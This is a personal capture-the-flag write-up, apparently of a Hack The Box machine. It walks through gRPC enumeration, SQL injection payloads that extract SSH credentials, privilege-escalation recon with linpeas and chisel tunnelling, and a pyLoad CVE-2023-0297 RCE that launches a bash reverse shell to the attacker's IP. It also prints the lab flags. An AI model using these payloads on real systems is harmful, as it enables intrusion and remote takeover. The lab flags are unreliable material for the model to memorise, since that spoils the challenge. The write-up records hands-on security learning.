	We have two  ports open, we did our directorys PC  and the exploits, nmap and content
	
	22/tcp    open  ssh
	50051/tcp open  unknown
	
	
	22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
	
	50051/tcp open  unknown
	
	
	10.10.11.214
	
	While I search on google, I watch that on the port 50051 its  gRPC on google
	
	```
	gRPC es un sistema de llamada a procedimiento remoto de código abierto desarrollado inicialmente en Google. Utiliza como transporte HTTP/2 y Protocol Buffers como lenguaje de descripción de interfaz.
	```
	
	This is a tool with GUI
	
	https://github.com/fullstorydev/grpcui
	
	Documentation about  GO grpcurl
	https://pkg.go.dev/github.com/fullstorydev/grpcurl
	
	this is another tool without GUI
	
	https://github.com/fullstorydev/grpcurl
	
	I first will try to exploit it with the  second one. Here i found a explanation about how to use it.
	https://medium.com/@sybrenbolandit/grpcurl-181299cf5210
	
	This was what i put 
	```c
	┌──(cds㉿kali)-[~/Downloads]
	└─$ grpcurl -plaintext 10.10.11.214:50051 list
	SimpleApp
	grpc.reflection.v1alpha.ServerReflection
	
	```
	I must use the "describe" method right know to get more info
	
	```c
	┌──(cds㉿kali)-[~/Downloads]
	└─$ grpcurl -plaintext 10.10.11.214:50051 describe                                       
	SimpleApp is a service:
	service SimpleApp {
	  rpc LoginUser ( .LoginUserRequest ) returns ( .LoginUserResponse );
	  rpc RegisterUser ( .RegisterUserRequest ) returns ( .RegisterUserResponse );
	  rpc getInfo ( .getInfoRequest ) returns ( .getInfoResponse );
	}
	grpc.reflection.v1alpha.ServerReflection is a service:
	service ServerReflection {
	  rpc ServerReflectionInfo ( stream .grpc.reflection.v1alpha.ServerReflectionRequest ) returns ( stream .grpc.reflection.v1alpha.ServerReflectionResponse );
	}
	
	```
	On the gprcui is more easy to make te request and responses, I don't know the how to make the pettitions on json... I will stop here ... I will go to the GUI
	
	```c
	./grpcurl -plaintext -format text -d {"name":"test","password":"test"};\ 10.10.11.214:50051 SimpleApp.RegisterUser 
	```
	
	
	
	The ui app is called on this way (obviously, first install it)
	```c
	┌──(cds㉿kali)-[~/Downloads]
	└─$ grpcui --plaintext 10.10.11.214:50051 
	```
	
	
	In the UI website we added a user called "test1" and the password was "test1"
	
	When we log in the app gives us a token, in this case this is the mine
	
	```
	|token|b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoidGVzdDEiLCJleHAiOjE2OTM5Mzg5NDh9.Kj4tce0D21KJ8kIq5L9vG9GioVHUWe-5VrSDsJ9mTOA'|
	```
	Now, we have to intercept this petition on burpsuit, we must add this token.  And im reading over there that this field "id" is "vulnerable to sqli" so, on this way i can have a user for ssh connection , called "sau" and the pass is "password". 
	
	So, I have todo a SQLI 
	
	![[Screenshot_2023-09-05_12_26_28.png]]
	This is the vulnerable place
	
	this is the command that you must use 
	```
	"id":"0 UNION SELECT GROUP_CONCAT(password) from accounts"
	```
	HOW THE HELL IS THIS INJECTION ??
	
	This was another valid one
	```
	"729 union SELECT username FROM accounts WHERE username NOT like 'sqlite_%' limit 1--"
	```
	And another one 
	```
	"id": "729 union SELECT username FROM accounts LIMIT 1 OFFSET 1;"
	```
	
	
	
	
	This is the response.. but how do I know if its ok or not ...
	
	![[Screenshot_2023-09-05_12_47_59.png]]
	
	Ok , learning a little bit, on this injection I just have to put something like this
	
	
	this is the message that it sends with the order by is ok
	
	   "message": "Unexpected \u003cclass 'TypeError'\u003e: 'NoneType' object is not subscriptable",
	   
	```
	302 order by 2
	```
	
	
	
	This one doesn't returns nothing just errors
	
	this is when you put a bad argument or the order by doesn't exist (when the order by exedes the info)
	
	   "message": "Unexpected \u003cclass 'TypeError'\u003e: bad argument type for built-in operation",
	```
	362' order by 1--;
	```
	
	
	REALMENTE NO ENTIENDO ESTA INYECCION SQL... COMO HAGO PARA VER LAS TALBAS ?? COMO HAGO PARA VER LO DEMAS ?? COMO HAGO PARA SABER QUE VERSION SQL ES ???? NO ENTIENDO .. TODO DA ERROR.
	
	Quizas esto usa SQL como lenguaje solamente, pero no he encontrado la forma de reconocer el tipo , si es MYSQL o POSTGRES u otro.
	
	
	
	Well, I have a password and I have a user 
	
	sau:HereIsYourPassWord1431
	Strangely this is ok to use it on ssh
	
	```
	ssh sau@10.10.11.214
	```
	
	
	I cat the user flag.txt
	
	and now i need to become a root.
	
	I use sudo -l  and i cant do nothing
	
	when i watch the groups of sau, there is anyone
	
	And I watched on the perm
	```
	find / -group adm 2>/dev/null 
	```
	this was the output
	
	```
	/var/log/auth.log.2.gz
	/var/log/auth.log.1
	/var/log/auth.log
	/var/log/dmesg
	/var/log/dmesg.1.gz
	/var/log/syslog.2.gz
	/var/log/audit
	/var/log/ufw.log
	/var/log/kern.log
	/var/log/ufw.log.2.gz
	/var/log/kern.log.1
	/var/log/syslog.1
	/var/log/kern.log.2.gz
	/var/log/ufw.log.1
	/var/log/syslog
	/var/log/dmesg.0
	/var/log/apt/term.log.2.gz
	/var/log/apt/term.log
	/var/log/apt/term.log.1.gz
	/var/spool/rsyslog
	
	```
	
	I try on the dmesg, but I cannot do so much i have no permissions... now i watched the ps -aux and my i'm not soo smart yet.. maybe.. the cappabilities ?
	
	```
	sau@pc:~$ getcap -r / 2>/dev/null
	/snap/core20/1778/usr/bin/ping = cap_net_raw+ep
	/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
	/usr/bin/ping = cap_net_raw+ep
	/usr/bin/mtr-packet = cap_net_raw+ep
	/usr/bin/traceroute6.iputils = cap_net_raw+ep
	
	```
	
	I can find something with linpeas.sh
	
	I share it with python server from my pc to the target pc
	
	```
	python3 -m http.server 80
	```
	
	and I request the document from the target machine
	
	```
	wget 10.10.11.16:80/linpeas.sh
	```
	chmod +x to linpeas.sh
	
	and now it execute it with ./linpeas.sh
	
	this give me some info that I do not know
	
	
	Another open ports
	```
	tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                                                                      
	tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
	tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
	tcp        0      0 0.0.0.0:9666            0.0.0.0:*               LISTEN      -                   
	tcp6       0      0 :::22                   :::*                    LISTEN      -                   
	tcp6       0      0 :::50051                :::*                    LISTEN      -    
	```
	
	Some vulnerabilities
	
	![[Screenshot_2023-09-05_16_03_51.png]]
	
	This CVE's that I really don't know how to exploit , and i really don't know if they are yet, some of them seems to be related with the daemon
	
	If  I want to be able to know that info on the PC i need to use chisel. 
	
	First I need to download it and as i did it put a pyhton server and download the file on the target machine (on the folder /var/tmp)
	
	And now to run chisel we must do this:
	
	on my machine:
	```
	./chisel server --reverse -p 1234 
	```
	on the victim:
	```
	./chisel client 10.10.16.28:1234 R:8000:127.0.0.1:8000/tcp
	```
	
	Now when I see the http://127.0.0.1:8000/ on my browser I can see this
	
	![[Screenshot_2023-09-05_16_30_59.png]]
	
	I need to find some vulnerability of this on google , exploit or something , because I have no credentials, this pyLoad is related in some way to the 
	
	
	
	This is the vulnerability in question..
	https://github.com/bAuh0lz/CVE-2023-0297_Pre-auth_RCE_in_pyLoad
	
	and this is the code that sugest to use 
	```
	curl -i -s -k -X $'POST' \
		    --data-binary $'jk=pyimport%20os;os.system(\"touch%20/tmp/pwnd\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
	    $'http://<target>/flash/addcrypted2'
	```
	
	first I need to create on the tmp folder a script called "bash.sh" with the content 
	
	
	```
	#!/bin/bash
	bash -i  >& /dev/tcp/10.10.16.28/1337 0>&1
	```
	and on the pwned machine I must do this
	
	```
	curl -i -s -k -X $'POST' \
	    --data-binary $'jk=pyimport%20os;os.system(\"bash%20/var/tmp/bash.sh\");f=function%20f2(){};&package=xxx&crypted=AAAA&&passwords=aaaa' \
	    $'http://127.0.0.1:8000/flash/addcrypted2'
	```
	
	So finally I did it ..
	
	
	root flag
	a77371e5cdde2a89688b40fcec7ad5f4
